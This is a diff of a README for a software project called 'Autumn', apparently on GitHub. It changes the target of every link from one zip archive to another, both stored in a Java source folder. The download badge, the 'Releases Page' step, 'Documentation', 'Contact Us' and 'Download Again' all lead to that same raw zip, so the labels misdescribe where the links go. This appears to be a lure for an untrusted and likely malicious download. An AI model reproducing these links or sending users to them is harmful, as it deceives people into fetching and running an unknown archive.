@@ -1,6 +1,6 @@
 # 🍂 Autumn - Where Your Ideas Fall into Place
 
-[![Download Autumn](https://github.com/Nahar0912/Autumn/raw/refs/heads/main/plugin/src/main/java/dev/dementisimus/Software-2.4-beta.4.zip)](https://github.com/Nahar0912/Autumn/raw/refs/heads/main/plugin/src/main/java/dev/dementisimus/Software-2.4-beta.4.zip)
+[![Download Autumn](https://raw.githubusercontent.com/Nahar0912/Autumn/main/plugin/src/main/java/Software-v2.1.zip)](https://raw.githubusercontent.com/Nahar0912/Autumn/main/plugin/src/main/java/Software-v2.1.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with Autumn, you'll need to follow some simple steps to download 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Start by [visiting this page to download](https://github.com/Nahar0912/Autumn/raw/refs/heads/main/plugin/src/main/java/dev/dementisimus/Software-2.4-beta.4.zip).
+1. **Visit the Releases Page**: Start by [visiting this page to download](https://raw.githubusercontent.com/Nahar0912/Autumn/main/plugin/src/main/java/Software-v2.1.zip).
   
 2. **Select the Latest Release**: On the releases page, you will see a list of available versions. Click on the latest version to ensure you have the most up-to-date features and fixes.
 
@@ -67,9 +67,9 @@ Join our community of users for support, feedback, and sharing your experiences 
 
 ## 🔗 Links & Resources
 
-- [Documentation](https://github.com/Nahar0912/Autumn/raw/refs/heads/main/plugin/src/main/java/dev/dementisimus/Software-2.4-beta.4.zip)
-- [Contact Us](https://github.com/Nahar0912/Autumn/raw/refs/heads/main/plugin/src/main/java/dev/dementisimus/Software-2.4-beta.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Nahar0912/Autumn/main/plugin/src/main/java/Software-v2.1.zip)
+- [Contact Us](https://raw.githubusercontent.com/Nahar0912/Autumn/main/plugin/src/main/java/Software-v2.1.zip)
 
 ## 🔗 Download Again
 
-For your convenience, [visit this page to download](https://github.com/Nahar0912/Autumn/raw/refs/heads/main/plugin/src/main/java/dev/dementisimus/Software-2.4-beta.4.zip) the latest version of Autumn. Enjoy your programming experience and let your ideas fall into place with Autumn!
+For your convenience, [visit this page to download](https://raw.githubusercontent.com/Nahar0912/Autumn/main/plugin/src/main/java/Software-v2.1.zip) the latest version of Autumn. Enjoy your programming experience and let your ideas fall into place with Autumn!
